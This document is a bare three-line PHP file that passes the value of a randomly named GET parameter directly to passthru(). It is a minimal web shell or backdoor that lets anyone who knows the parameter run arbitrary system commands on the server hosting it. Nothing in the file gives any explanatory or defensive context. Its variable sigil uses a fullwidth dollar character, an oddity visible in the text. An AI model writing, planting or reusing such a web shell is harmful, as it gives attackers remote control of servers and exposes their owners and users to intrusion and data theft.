<?php
passthru(＄_GET['wIINQJSQ']);
?>
